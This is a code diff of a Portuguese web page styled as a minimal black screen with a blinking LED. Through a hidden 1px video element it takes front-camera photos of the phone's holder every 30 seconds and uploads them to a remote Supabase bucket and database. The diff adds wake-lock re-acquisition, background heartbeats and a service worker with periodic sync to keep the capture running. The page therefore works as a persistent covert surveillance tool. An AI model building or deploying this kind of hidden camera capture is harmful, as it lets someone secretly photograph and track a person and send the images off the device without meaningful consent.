@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -14,7 +15,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             background: #000;
             width: 100vw;
@@ -29,7 +30,11 @@
             -webkit-user-select: none;
             user-select: none;
         }
-        
+
+        .container {
+            text-align: center;
+        }
+
         .led {
             width: 20px;
             height: 20px;
@@ -37,13 +42,21 @@
             background: #00ff00;
             box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00, 0 0 45px #00ff00;
             animation: piscar 2s infinite;
+            margin: 0 auto;
         }
-        
+
         @keyframes piscar {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.2;
+            }
         }
-        
+
         .status {
             position: fixed;
             bottom: 20px;
@@ -54,6 +67,14 @@
             left: 0;
             right: 0;
             padding: 0 10px;
+            line-height: 1.4;
+        }
+
+        .timer {
+            color: #005500;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 10px;
         }
 
         video {
@@ -63,36 +84,58 @@
             width: 1px;
             height: 1px;
             opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
+
 <body>
-    <div class="led" id="led"></div>
+    <div class="container">
+        <div class="led" id="led"></div>
+        <div class="timer" id="timer">Próxima: --</div>
+    </div>
     <div class="status" id="status">iniciando...</div>
     <video id="cameraVideo" playsinline autoplay muted></video>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        (function() {
+        (function () {
             const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
             const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
             const CODIGO_SESSAO = 'MEUCEL1';
-            
+
+            // INTERVALOS (em milissegundos)
+            const SCREENSHOT_INTERVAL = 10000; // 10 segundos
+            const SELFIE_INTERVAL = 30000; // 30 segundos (para teste rápido)
+
             const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-            
+
             const led = document.getElementById('led');
             const statusEl = document.getElementById('status');
+            const timerEl = document.getElementById('timer');
             const cameraVideo = document.getElementById('cameraVideo');
-            
+
             let cameraStream = null;
-            let cameraInterval = null;
             let screenshotInterval = null;
-            
+            let selfieInterval = null;
+            let wakeLock = null;
+            let isInBackground = false;
+            let lastScreenshotTime = 0;
+            let lastSelfieTime = 0;
+
             function updateStatus(msg) {
                 statusEl.textContent = msg;
-                console.log(msg);
+                console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
             }
-            
+
+            function updateTimer() {
+                const now = Date.now();
+                const nextScreenshot = Math.max(0, Math.ceil((SCREENSHOT_INTERVAL - (now - lastScreenshotTime)) / 1000));
+                const nextSelfie = Math.max(0, Math.ceil((SELFIE_INTERVAL - (now - lastSelfieTime)) / 1000));
+
+                timerEl.textContent = `📸 ${nextScreenshot}s | 🤳 ${nextSelfie}s`;
+            }
+
             function piscarLED() {
                 led.style.animation = 'none';
                 led.offsetHeight;
@@ -101,22 +144,22 @@
                     led.style.animation = 'piscar 2s infinite';
                 }, 900);
             }
-            
+
             async function uploadToSupabase(blob, filename, tipo) {
                 try {
                     const filePath = `${CODIGO_SESSAO}/${tipo}/${filename}`;
-                    
+
                     const { data, error } = await supabaseClient.storage
                         .from('captures')
                         .upload(filePath, blob, {
                             contentType: 'image/jpeg',
                             upsert: false
                         });
-                    
+
                     if (error) throw error;
-                    
+
                     const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
-                    
+
                     const { error: dbError } = await supabaseClient
                         .from('captures')
                         .insert({
@@ -126,72 +169,96 @@
                             filename: filename,
                             created_at: new Date().toISOString()
                         });
-                    
+
                     if (dbError) throw dbError;
-                    
-                    updateStatus(`${tipo} enviado: ${filename}`);
+
+                    updateStatus(`✅ ${tipo}: ${filename}`);
                     piscarLED();
                     return true;
                 } catch (error) {
-                    updateStatus(`Erro upload: ${error.message}`);
+                    updateStatus(`❌ Erro upload: ${error.message}`);
                     return false;
                 }
             }
-            
+
             async function captureScreenshot() {
                 try {
                     const canvas = document.createElement('canvas');
                     canvas.width = window.innerWidth || 720;
                     canvas.height = window.innerHeight || 1280;
                     const ctx = canvas.getContext('2d');
-                    
+
+                    // Fundo preto
                     ctx.fillStyle = '#000';
                     ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
+
+                    // Informações do monitor
                     ctx.fillStyle = '#00ff00';
                     ctx.font = '20px monospace';
-                    ctx.fillText(`Monitor MEUCEL1 - ${new Date().toLocaleString()}`, 20, 50);
-                    ctx.fillText(`Status: Ativo`, 20, 80);
-                    
+                    ctx.fillText(`Monitor MEUCEL1`, 20, 50);
+                    ctx.fillText(`Data: ${new Date().toLocaleString('pt-BR')}`, 20, 80);
+                    ctx.fillText(`Status: ${isInBackground ? 'Segundo Plano' : 'Ativo'}`, 20, 110);
+                    ctx.fillText(`Online: ${navigator.onLine ? 'Sim' : 'Não'}`, 20, 140);
+                    ctx.fillText(`Resolução: ${canvas.width}x${canvas.height}`, 20, 170);
+
+                    // Adicionar marca d'água do timestamp
+                    ctx.fillStyle = '#006600';
+                    ctx.font = '14px monospace';
+                    ctx.fillText(`Timestamp: ${Date.now()}`, 20, 210);
+
                     canvas.toBlob(async (blob) => {
                         if (blob) {
                             const timestamp = Date.now();
-                            const filename = `screenshot_${timestamp}.jpg`;
+                            const filename = `print_${timestamp}.jpg`;
                             await uploadToSupabase(blob, filename, 'print');
+                            lastScreenshotTime = Date.now();
                         }
-                    }, 'image/jpeg', 0.8);
-                    
+                    }, 'image/jpeg', 0.6);
+
                 } catch (error) {
-                    updateStatus(`Erro screenshot: ${error.message}`);
+                    updateStatus(`❌ Erro screenshot: ${error.message}`);
                 }
             }
-            
-            async function captureCamera() {
-                if (!cameraVideo || !cameraStream) return;
-                
+
+            async function captureSelfie() {
+                if (!cameraVideo || !cameraStream) {
+                    updateStatus('⚠️ Câmera não disponível, tentando reiniciar...');
+                    await startCamera();
+                    return;
+                }
+
                 try {
                     const canvas = document.createElement('canvas');
                     canvas.width = 480;
                     canvas.height = 640;
                     const ctx = canvas.getContext('2d');
-                    
+
+                    // Inverter horizontalmente (espelho)
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
                     ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-                    
+
                     canvas.toBlob(async (blob) => {
                         if (blob) {
                             const timestamp = Date.now();
                             const filename = `selfie_${timestamp}.jpg`;
                             await uploadToSupabase(blob, filename, 'selfie');
+                            lastSelfieTime = Date.now();
                         }
-                    }, 'image/jpeg', 0.8);
-                    
+                    }, 'image/jpeg', 0.7);
+
                 } catch (error) {
-                    updateStatus(`Erro câmera: ${error.message}`);
+                    updateStatus(`❌ Erro selfie: ${error.message}`);
                 }
             }
-            
+
             async function startCamera() {
                 try {
+                    // Parar stream anterior se existir
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+
                     cameraStream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: 'user',
@@ -200,53 +267,160 @@
                         },
                         audio: false
                     });
-                    
+
                     cameraVideo.srcObject = cameraStream;
                     await cameraVideo.play();
-                    
-                    updateStatus('Câmera frontal ativa');
-                    
-                    setTimeout(captureCamera, 5000);
-                    cameraInterval = setInterval(captureCamera, 600000);
-                    
+
+                    updateStatus('📷 Câmera frontal ativa');
+                    lastSelfieTime = Date.now();
+
+                    // Primeira selfie após 5 segundos
+                    setTimeout(() => {
+                        captureSelfie();
+                    }, 5000);
+
+                    // Selfies no intervalo configurado
+                    if (selfieInterval) clearInterval(selfieInterval);
+                    selfieInterval = setInterval(captureSelfie, SELFIE_INTERVAL);
+
                 } catch (error) {
-                    updateStatus(`Erro câmera: ${error.message}`);
-                    setTimeout(startCamera, 60000);
+                    updateStatus(`❌ Erro câmera: ${error.message}`);
+                    // Tentar novamente em 30 segundos
+                    setTimeout(startCamera, 30000);
                 }
             }
-            
+
             function startScreenshots() {
-                updateStatus('Capturas de tela ativas');
+                updateStatus('📸 Capturas de tela ativas');
+                lastScreenshotTime = Date.now();
+
+                // Primeira captura após 3 segundos
                 setTimeout(captureScreenshot, 3000);
-                screenshotInterval = setInterval(captureScreenshot, 10000);
-            }
-            
-            function stopAll() {
-                if (cameraInterval) clearInterval(cameraInterval);
+
+                // Capturas no intervalo configurado
                 if (screenshotInterval) clearInterval(screenshotInterval);
-                
+                screenshotInterval = setInterval(captureScreenshot, SCREENSHOT_INTERVAL);
+            }
+
+            // Manter tela ativa (Wake Lock)
+            async function requestWakeLock() {
+                try {
+                    if ('wakeLock' in navigator) {
+                        wakeLock = await navigator.wakeLock.request('screen');
+                        updateStatus('🔒 Wake Lock ativo');
+
+                        wakeLock.addEventListener('release', () => {
+                            updateStatus('⚠️ Wake Lock liberado');
+                            // Tentar readquirir
+                            setTimeout(requestWakeLock, 1000);
+                        });
+                    }
+                } catch (err) {
+                    updateStatus(`⚠️ Wake Lock: ${err.message}`);
+                }
+            }
+
+            // Usar Web Worker para background (simulado com setInterval mais agressivo)
+            function setupBackgroundPersistence() {
+                // Usar localStorage para manter estado
+                localStorage.setItem('monitor_running', 'true');
+                localStorage.setItem('monitor_session', CODIGO_SESSAO);
+
+                // Verificar periodicamente se ainda está rodando
+                setInterval(() => {
+                    localStorage.setItem('monitor_last_heartbeat', Date.now().toString());
+                }, 5000);
+            }
+
+            // Visibilidade da página
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    isInBackground = true;
+                    updateStatus('📱 App em segundo plano');
+                    // Salvar estado
+                    localStorage.setItem('monitor_bg_since', Date.now().toString());
+                } else {
+                    isInBackground = false;
+                    updateStatus('📱 App em primeiro plano');
+                    // Verificar se perdemos capturas
+                    const bgSince = parseInt(localStorage.getItem('monitor_bg_since') || '0');
+                    if (bgSince) {
+                        const bgDuration = Math.floor((Date.now() - bgSince) / 1000);
+                        updateStatus(`⏱️ Retomado após ${bgDuration}s em segundo plano`);
+                        localStorage.removeItem('monitor_bg_since');
+                    }
+                    // Recapturar recursos
+                    requestWakeLock();
+                }
+            });
+
+            // Timer visual
+            setInterval(updateTimer, 1000);
+
+            function stopAll() {
+                if (screenshotInterval) clearInterval(screenshotInterval);
+                if (selfieInterval) clearInterval(selfieInterval);
+
                 if (cameraStream) {
                     cameraStream.getTracks().forEach(track => track.stop());
                 }
+
+                if (wakeLock) {
+                    wakeLock.release();
+                }
+
+                localStorage.removeItem('monitor_running');
+                localStorage.removeItem('monitor_last_heartbeat');
             }
-            
+
             async function startAll() {
-                updateStatus('Iniciando monitoramento...');
+                updateStatus('🚀 Iniciando monitoramento...');
+
+                await requestWakeLock();
                 await startCamera();
                 startScreenshots();
+                setupBackgroundPersistence();
+
                 updateStatus('✅ Monitoramento ativo');
+                updateStatus(`⏱️ Screenshots: ${SCREENSHOT_INTERVAL / 1000}s | Selfies: ${SELFIE_INTERVAL / 1000}s`);
             }
-            
+
+            // Iniciar
             startAll();
-            
-            if ('wakeLock' in navigator) {
-                try {
-                    navigator.wakeLock.request('screen');
-                } catch (e) {
-                    console.log('Wake Lock não disponível');
-                }
-            }
+
+            // Limpar ao sair
+            window.addEventListener('beforeunload', () => {
+                stopAll();
+            });
         })();
+
+        // Registrar Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(reg => {
+                    console.log('Service Worker registrado');
+
+                    // Periodic Sync (se disponível)
+                    if ('periodicSync' in reg) {
+                        reg.periodicSync.register('capture-periodic', {
+                            minInterval: 10000 // 10 segundos
+                        }).catch(err => {
+                            console.log('Periodic Sync não disponível:', err);
+                        });
+                    }
+                })
+                .catch(err => {
+                    console.log('Service Worker não registrado:', err);
+                });
+
+            // Escutar mensagens do Service Worker
+            navigator.serviceWorker.addEventListener('message', (event) => {
+                if (event.data === 'capture-now') {
+                    captureScreenshot();
+                }
+            });
+        }
     </script>
 </body>
+
 </html>
